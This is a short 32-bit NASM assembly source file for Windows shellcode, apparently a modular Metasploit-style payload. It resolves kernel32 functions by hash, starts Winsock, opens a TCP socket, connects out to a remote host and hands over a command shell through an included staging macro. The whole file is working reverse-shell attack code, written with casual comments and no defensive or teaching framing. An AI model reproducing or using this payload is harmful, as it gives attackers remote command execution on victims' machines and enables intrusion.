BITS 32

%include "_kernel32_init.asm"
%include "_wsa_init.asm"
%include "stage_wsa_shell.asm"

; hash up kernel32 foo
KERNEL32_INIT

; setup the address table
%define _WSA_INIT_TBLEN 3

%macro _WSA_INIT_TB 0
  _WSA_INIT_TB_CONNECT
  _WSA_INIT_TB_WSASOCK
  _WSA_INIT_TB_WSASTART
%endmacro


make_startup_room:         ; setup ebp for WSAStartup data
  push BYTE 20             ; push 20
  pop eax                  ; register
  mul eax                  ; square that shit = 0x190
  sub esp, eax             ; make room for WSAStartup data
  mov ecx, esp

make_table_room:           ; setup ebp for address table
  sub esp, BYTE (_WSA_INIT_TBLEN * 4)
  push edi                 ; [ebp + 8] = LoadLibraryA
  push esi                 ; [ebp + 4] = LGetProcAddress
  push ebx                 ; [ebp + 0] = kernel32 dll base
  mov ebp, esp
  push ecx                 ; push WSAStartup data address
  push eax                 ; push 0x190

make_table:                ; hash the table
  WSA_HASH_WINSOCK

wsa_startup:
  ; call WSAStartup
  WSA_CALL_WSASTART

make_socket:
  ; call WSASocketA, get a tcp socket (screw the stack)
  WSA_CALL_SOCKET 'tcp'
  ; we got the socket in edi

connect_socket:
  WSA_CALL_CONNECT 0

get_shell:
  ; ebp is still setup right, and so is edi, lets get a shell!
  STAGE_WSA_SHELL 1  ; resolve it's own functions
